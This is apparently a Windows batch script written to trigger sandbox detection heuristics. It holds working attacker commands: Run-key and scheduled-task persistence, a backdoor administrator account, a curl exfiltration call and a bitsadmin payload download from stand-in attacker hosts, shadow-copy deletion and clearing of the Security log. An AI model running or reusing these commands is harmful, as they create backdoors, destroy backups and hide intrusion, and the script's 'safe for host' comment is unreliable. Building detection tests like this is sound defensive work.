@echo off
REM Fake suspicious script for sandbox testing - safe for host
REM Triggers heuristics: persistence, recon, exfil patterns
powershell -ExecutionPolicy Bypass -NoProfile -EncodedCommand SGVsbG8K
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v evil /d C:ake.exe /f
schtasks /create /sc minute /mo 1 /tn FakeTask /tr C:ake.exe
net user backdoor P@ssw0rd123 /add
net localgroup administrators backdoor /add
wmic process call create cmd.exe
curl -X POST http://malicious-c2.example.com/exfil -d %USERNAME%
bitsadmin /transfer evil http://attacker.example/payload.exe C:\payload.exe
vssadmin delete shadows /all /quiet
wevtutil cl Security
echo Done.
